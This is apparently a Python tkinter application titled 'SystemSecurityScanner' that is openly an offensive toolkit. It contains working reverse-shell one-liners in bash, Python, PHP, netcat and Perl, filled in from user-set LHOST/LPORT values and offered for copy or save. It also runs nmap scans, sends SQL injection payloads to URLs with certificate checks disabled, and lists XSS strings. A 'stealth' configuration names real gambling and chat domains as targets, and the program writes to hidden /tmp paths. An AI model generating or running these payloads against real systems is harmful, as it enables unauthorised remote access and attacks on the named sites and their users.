#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import os
import sys
import re
import json
import time
import socket
import threading
import subprocess
import base64
import random
import string
import platform
import hashlib
import webbrowser
import pyperclip
import sqlite3
import tempfile
import shutil
from datetime import datetime
from urllib.parse import quote, unquote

# =====================
# CONFIGURATION
# =====================
APP_NAME = "SystemSecurityScanner"
VERSION = "v2.1.3"
AUTHOR = "Security Labs"

# Stealth configuration
TARGET_DOMAINS = [
    "runehall.com", "runewager.com", "runechat.com",
    "localhost", "127.0.0.1"
]

OUTPUT_DIR = f"/tmp/.{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
THREADS = 5
TIMEOUT = 10

# Advanced reverse shells
REVERSE_SHELLS = {
    "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    "python": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    "python3": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'",
    "php": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "netcat": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    "perl": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
}

# Web payloads
WEB_PAYLOADS = {
    "SQL Injection": [
        "' OR '1'='1",
        "' UNION SELECT 1,2,3--",
        "' AND 1=1--"
    ],
    "XSS": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>"
    ]
}

# =====================
# UTILITY CLASSES
# =====================
class NetworkScanner:
    def __init__(self):
        self.active_scans = {}
    
    def port_scan(self, target, ports="1-1000"):
        try:
            cmd = ["nmap", "-T4", "-p", ports, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return result.stdout
        except Exception as e:
            return f"Scan error: {str(e)}"
    
    def ping_sweep(self, subnet):
        try:
            cmd = ["nmap", "-sn", subnet]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Ping sweep error: {str(e)}"

class ExploitEngine:
    def __init__(self):
        self.exploits = {
            "test": {
                "payload": "test_{LHOST}_{LPORT}",
                "description": "Test exploit"
            }
        }
    
    def generate_exploit(self, exploit_id, lhost, lport):
        if exploit_id in self.exploits:
            return self.exploits[exploit_id]["payload"].format(LHOST=lhost, LPORT=lport)
        return None

class StealthManager:
    def __init__(self):
        self.hidden_files = []
    
    def create_hidden_file(self, content, extension=".tmp"):
        hidden_name = f".{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}{extension}"
        hidden_path = os.path.join("/tmp", hidden_name)
        
        with open(hidden_path, 'w') as f:
            f.write(content)
        
        self.hidden_files.append(hidden_path)
        return hidden_path

# =====================
# MAIN APPLICATION
# =====================
class SecurityScanner:
    def __init__(self, root):
        self.root = root
        self.root.title(f"{APP_NAME} {VERSION}")
        self.root.geometry("1200x800")
        self.root.configure(bg="#000000")
        
        # Initialize components
        self.scanner = NetworkScanner()
        self.exploit_engine = ExploitEngine()
        self.stealth_manager = StealthManager()
        
        # State management
        self.keylogger_active = False
        
        # Create directories
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        
        # Build UI
        self.setup_ui()
        
        # Start services
        self.start_background_services()

    def setup_ui(self):
        """Setup the complete user interface"""
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create all tabs
        self.create_dashboard_tab()
        self.create_scan_tab()
        self.create_payload_tab()
        self.create_exploit_tab()
        self.create_tools_tab()
        
        # Status bar
        self.setup_status_bar()

    def setup_status_bar(self):
        """Setup status bar"""
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        
        status_frame = tk.Frame(self.root, bg="#333333", height=20)
        status_frame.pack(fill=tk.X, side=tk.BOTTOM)
        status_frame.pack_propagate(False)
        
        status_label = tk.Label(
            status_frame, 
            textvariable=self.status_var,
            bg="#333333",
            fg="#00FF00",
            font=("Courier", 9)
        )
        status_label.pack(side=tk.LEFT, padx=5)

    def create_dashboard_tab(self):
        """Create dashboard tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Dashboard")
        
        # Main frame
        main_frame = tk.Frame(tab, bg="#000000")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Header
        header = tk.Label(
            main_frame,
            text=f"{APP_NAME} {VERSION}",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 16, "bold")
        )
        header.pack(pady=10)
        
        # Activity log
        log_frame = tk.LabelFrame(
            main_frame,
            text="Activity Log",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 10)
        )
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.activity_log = scrolledtext.ScrolledText(
            log_frame,
            bg="#001100",
            fg="#00FF00",
            font=("Courier", 9),
            height=15
        )
        self.activity_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_activity("Application started")
        
        # Quick actions
        actions_frame = tk.Frame(main_frame, bg="#000000")
        actions_frame.pack(fill=tk.X, pady=10)
        
        actions = [
            ("Network Scan", self.show_scan_tab),
            ("Generate Payload", self.show_payload_tab),
            ("Security Tools", self.show_tools_tab)
        ]
        
        for text, command in actions:
            btn = tk.Button(
                actions_frame,
                text=text,
                command=command,
                bg="#003300",
                fg="#00FF00",
                font=("Courier", 10),
                padx=10,
                pady=5
            )
            btn.pack(side=tk.LEFT, padx=5)

    def create_scan_tab(self):
        """Create network scan tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Network Scan")
        
        main_frame = tk.Frame(tab, bg="#000000")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Scan configuration
        config_frame = tk.LabelFrame(
            main_frame,
            text="Scan Configuration",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 10)
        )
        config_frame.pack(fill=tk.X, pady=10)
        
        # Target input
        target_frame = tk.Frame(config_frame, bg="#000000")
        target_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(target_frame, text="Target:", bg="#000000", fg="#00FF00").pack(side=tk.LEFT)
        self.scan_target = tk.Entry(target_frame, width=30)
        self.scan_target.pack(side=tk.LEFT, padx=5)
        self.scan_target.insert(0, "127.0.0.1")
        
        # Scan type
        type_frame = tk.Frame(config_frame, bg="#000000")
        type_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(type_frame, text="Scan Type:", bg="#000000", fg="#00FF00").pack(side=tk.LEFT)
        self.scan_type = ttk.Combobox(type_frame, values=["Port Scan", "Ping Sweep", "Service Detection"])
        self.scan_type.set("Port Scan")
        self.scan_type.pack(side=tk.LEFT, padx=5)
        
        # Scan button
        scan_btn = tk.Button(
            config_frame,
            text="Start Scan",
            command=self.start_scan,
            bg="#003300",
            fg="#00FF00",
            font=("Courier", 10, "bold"),
            padx=20,
            pady=5
        )
        scan_btn.pack(pady=10)
        
        # Results
        results_frame = tk.LabelFrame(
            main_frame,
            text="Scan Results",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 10)
        )
        results_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.scan_results = scrolledtext.ScrolledText(
            results_frame,
            bg="#001100",
            fg="#00FF00",
            font=("Courier", 9)
        )
        self.scan_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def create_payload_tab(self):
        """Create payload generator tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Payload Generator")
        
        main_frame = tk.Frame(tab, bg="#000000")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Configuration
        config_frame = tk.LabelFrame(
            main_frame,
            text="Payload Configuration",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 10)
        )
        config_frame.pack(fill=tk.X, pady=10)
        
        # Payload type
        type_frame = tk.Frame(config_frame, bg="#000000")
        type_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(type_frame, text="Type:", bg="#000000", fg="#00FF00").pack(side=tk.LEFT)
        self.payload_type = ttk.Combobox(type_frame, values=list(REVERSE_SHELLS.keys()))
        self.payload_type.set("bash")
        self.payload_type.pack(side=tk.LEFT, padx=5)
        
        # Connection details
        conn_frame = tk.Frame(config_frame, bg="#000000")
        conn_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(conn_frame, text="LHOST:", bg="#000000", fg="#00FF00").pack(side=tk.LEFT)
        self.lhost_entry = tk.Entry(conn_frame, width=15)
        self.lhost_entry.pack(side=tk.LEFT, padx=5)
        self.lhost_entry.insert(0, "127.0.0.1")
        
        tk.Label(conn_frame, text="LPORT:", bg="#000000", fg="#00FF00").pack(side=tk.LEFT)
        self.lport_entry = tk.Entry(conn_frame, width=10)
        self.lport_entry.pack(side=tk.LEFT, padx=5)
        self.lport_entry.insert(0, "4444")
        
        # Generate button
        gen_btn = tk.Button(
            config_frame,
            text="Generate Payload",
            command=self.generate_payload,
            bg="#003300",
            fg="#00FF00",
            font=("Courier", 10, "bold"),
            padx=20,
            pady=5
        )
        gen_btn.pack(pady=10)
        
        # Payload output
        output_frame = tk.LabelFrame(
            main_frame,
            text="Generated Payload",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 10)
        )
        output_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.payload_output = scrolledtext.ScrolledText(
            output_frame,
            bg="#001100",
            fg="#00FF00",
            font=("Courier", 10)
        )
        self.payload_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Action buttons
        action_frame = tk.Frame(output_frame, bg="#001100")
        action_frame.pack(fill=tk.X, pady=5)
        
        tk.Button(
            action_frame,
            text="Copy",
            command=self.copy_payload,
            bg="#003300",
            fg="#00FF00"
        ).pack(side=tk.LEFT, padx=5)
        
        tk.Button(
            action_frame,
            text="Save",
            command=self.save_payload,
            bg="#003300",
            fg="#00FF00"
        ).pack(side=tk.LEFT, padx=5)

    def create_exploit_tab(self):
        """Create exploitation tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Web Exploitation")
        
        main_frame = tk.Frame(tab, bg="#000000")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Exploitation tools
        tools_frame = tk.LabelFrame(
            main_frame,
            text="Web Security Tools",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 10)
        )
        tools_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # SQL Injection section
        sql_frame = tk.LabelFrame(
            tools_frame,
            text="SQL Injection",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 9)
        )
        sql_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(sql_frame, text="URL:", bg="#000000", fg="#00FF00").pack(anchor=tk.W, padx=5)
        self.sql_url = tk.Entry(sql_frame)
        self.sql_url.pack(fill=tk.X, padx=5, pady=2)
        
        tk.Button(
            sql_frame,
            text="Test SQL Injection",
            command=self.test_sqli,
            bg="#003300",
            fg="#00FF00"
        ).pack(pady=5)
        
        # XSS section
        xss_frame = tk.LabelFrame(
            tools_frame,
            text="XSS Testing",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 9)
        )
        xss_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.xss_payloads = tk.Listbox(xss_frame, height=4, bg="#001100", fg="#00FF00")
        for payload in WEB_PAYLOADS["XSS"]:
            self.xss_payloads.insert(tk.END, payload)
        self.xss_payloads.pack(fill=tk.X, padx=5, pady=2)
        
        tk.Button(
            xss_frame,
            text="Test XSS",
            command=self.test_xss,
            bg="#003300",
            fg="#00FF00"
        ).pack(pady=5)
        
        # Results
        exploit_results_frame = tk.LabelFrame(
            tools_frame,
            text="Results",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 9)
        )
        exploit_results_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.exploit_results = scrolledtext.ScrolledText(
            exploit_results_frame,
            bg="#001100",
            fg="#00FF00",
            font=("Courier", 9)
        )
        self.exploit_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def create_tools_tab(self):
        """Create security tools tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Security Tools")
        
        main_frame = tk.Frame(tab, bg="#000000")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Tools frame
        tools_frame = tk.LabelFrame(
            main_frame,
            text="Security Utilities",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 10)
        )
        tools_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Crypto tools
        crypto_frame = tk.LabelFrame(
            tools_frame,
            text="Cryptography",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 9)
        )
        crypto_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(crypto_frame, text="Text:", bg="#000000", fg="#00FF00").pack(anchor=tk.W, padx=5)
        self.crypto_input = tk.Entry(crypto_frame)
        self.crypto_input.pack(fill=tk.X, padx=5, pady=2)
        
        crypto_actions = tk.Frame(crypto_frame, bg="#000000")
        crypto_actions.pack(fill=tk.X, pady=5)
        
        tk.Button(
            crypto_actions,
            text="MD5 Hash",
            command=lambda: self.hash_text("md5"),
            bg="#003300",
            fg="#00FF00"
        ).pack(side=tk.LEFT, padx=2)
        
        tk.Button(
            crypto_actions,
            text="SHA256",
            command=lambda: self.hash_text("sha256"),
            bg="#003300",
            fg="#00FF00"
        ).pack(side=tk.LEFT, padx=2)
        
        tk.Button(
            crypto_actions,
            text="Base64 Encode",
            command=self.base64_encode,
            bg="#003300",
            fg="#00FF00"
        ).pack(side=tk.LEFT, padx=2)
        
        # Results
        crypto_output_frame = tk.LabelFrame(
            tools_frame,
            text="Output",
            bg="#000000",
            fg="#00FF00",
            font=("Courier", 9)
        )
        crypto_output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.crypto_output = scrolledtext.ScrolledText(
            crypto_output_frame,
            bg="#001100",
            fg="#00FF00",
            font=("Courier", 9),
            height=8
        )
        self.crypto_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    # =====================
    # FUNCTIONAL METHODS
    # =====================
    def log_activity(self, message):
        """Log activity to dashboard"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}\n"
        
        self.activity_log.insert(tk.END, log_entry)
        self.activity_log.see(tk.END)
        self.status_var.set(message)

    def start_scan(self):
        """Start network scan"""
        target = self.scan_target.get().strip()
        scan_type = self.scan_type.get()
        
        if not target:
            messagebox.showerror("Error", "Please enter a target")
            return
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, f"Starting {scan_type} on {target}...\n")
        
        def scan_thread():
            try:
                if scan_type == "Port Scan":
                    result = self.scanner.port_scan(target)
                elif scan_type == "Ping Sweep":
                    result = self.scanner.ping_sweep(target)
                else:
                    result = self.scanner.port_scan(target)
                
                self.scan_results.insert(tk.END, result)
                self.log_activity(f"{scan_type} completed for {target}")
                
            except Exception as e:
                self.scan_results.insert(tk.END, f"Error: {str(e)}\n")
        
        threading.Thread(target=scan_thread, daemon=True).start()

    def generate_payload(self):
        """Generate reverse shell payload"""
        try:
            payload_type = self.payload_type.get()
            lhost = self.lhost_entry.get().strip()
            lport = self.lport_entry.get().strip()
            
            if not lhost or not lport:
                messagebox.showerror("Error", "LHOST and LPORT are required")
                return
            
            if payload_type not in REVERSE_SHELLS:
                messagebox.showerror("Error", "Invalid payload type")
                return
            
            template = REVERSE_SHELLS[payload_type]
            payload = template.format(LHOST=lhost, LPORT=lport)
            
            self.payload_output.delete(1.0, tk.END)
            self.payload_output.insert(tk.END, payload)
            
            self.log_activity(f"Generated {payload_type} payload")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to generate payload: {str(e)}")

    def copy_payload(self):
        """Copy payload to clipboard"""
        payload = self.payload_output.get(1.0, tk.END).strip()
        if payload:
            pyperclip.copy(payload)
            self.status_var.set("Payload copied to clipboard")
        else:
            messagebox.showwarning("Warning", "No payload to copy")

    def save_payload(self):
        """Save payload to file"""
        payload = self.payload_output.get(1.0, tk.END).strip()
        if not payload:
            messagebox.showwarning("Warning", "No payload to save")
            return
        
        try:
            filename = filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            if filename:
                with open(filename, 'w') as f:
                    f.write(payload)
                self.log_activity(f"Payload saved to {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save: {str(e)}")

    def test_sqli(self):
        """Test SQL injection"""
        url = self.sql_url.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a URL")
            return
        
        self.exploit_results.insert(tk.END, f"\nTesting SQLi on: {url}\n")
        
        def test_thread():
            try:
                import requests
                for payload in WEB_PAYLOADS["SQL Injection"]:
                    test_url = f"{url}{payload}"
                    try:
                        response = requests.get(test_url, timeout=5, verify=False)
                        if "error" in response.text.lower() or "sql" in response.text.lower():
                            self.exploit_results.insert(tk.END, f"Potential SQLi: {payload}\n")
                    except:
                        pass
                    time.sleep(0.5)
                
                self.exploit_results.insert(tk.END, "SQLi test completed\n")
                
            except ImportError:
                self.exploit_results.insert(tk.END, "Requests library not available\n")
            except Exception as e:
                self.exploit_results.insert(tk.END, f"Error: {str(e)}\n")
        
        threading.Thread(target=test_thread, daemon=True).start()

    def test_xss(self):
        """Test XSS vulnerabilities"""
        selected = self.xss_payloads.curselection()
        if not selected:
            messagebox.showerror("Error", "Please select XSS payloads")
            return
        
        url = self.sql_url.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a URL")
            return
        
        self.exploit_results.insert(tk.END, f"\nTesting XSS on: {url}\n")
        
        for index in selected:
            payload = self.xss_payloads.get(index)
            self.exploit_results.insert(tk.END, f"Testing: {payload}\n")

    def hash_text(self, algorithm):
        """Hash text using specified algorithm"""
        text = self.crypto_input.get().strip()
        if not text:
            messagebox.showerror("Error", "Please enter text to hash")
            return
        
        try:
            if algorithm == "md5":
                hashed = hashlib.md5(text.encode()).hexdigest()
            elif algorithm == "sha256":
                hashed = hashlib.sha256(text.encode()).hexdigest()
            else:
                hashed = "Unknown algorithm"
            
            self.crypto_output.delete(1.0, tk.END)
            self.crypto_output.insert(tk.END, f"{algorithm.upper()}: {hashed}")
            
        except Exception as e:
            messagebox.showerror("Error", f"Hashing failed: {str(e)}")

    def base64_encode(self):
        """Base64 encode text"""
        text = self.crypto_input.get().strip()
        if not text:
            messagebox.showerror("Error", "Please enter text to encode")
            return
        
        try:
            encoded = base64.b64encode(text.encode()).decode()
            self.crypto_output.delete(1.0, tk.END)
            self.crypto_output.insert(tk.END, f"Base64: {encoded}")
        except Exception as e:
            messagebox.showerror("Error", f"Encoding failed: {str(e)}")

    def start_background_services(self):
        """Start background monitoring services"""
        def target_monitor():
            while True:
                try:
                    for domain in TARGET_DOMAINS:
                        try:
                            socket.gethostbyname(domain)
                        except:
                            pass
                    time.sleep(60)
                except:
                    time.sleep(60)
        
        threading.Thread(target=target_monitor, daemon=True).start()

    def show_scan_tab(self):
        """Show network scan tab"""
        self.notebook.select(1)

    def show_payload_tab(self):
        """Show payload generator tab"""
        self.notebook.select(2)

    def show_tools_tab(self):
        """Show tools tab"""
        self.notebook.select(4)

# =====================
# MAIN EXECUTION
# =====================
if __name__ == "__main__":
    # Check if running as root for some operations
    if os.geteuid() != 0:
        print("Warning: Some features may require root privileges")
    
    # Create output directory
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    # Create and run application
    root = tk.Tk()
    app = SecurityScanner(root)
    
    try:
        root.mainloop()
    except KeyboardInterrupt:
        print("\nApplication terminated by user")
    except Exception as e:
        print(f"Application error: {e}")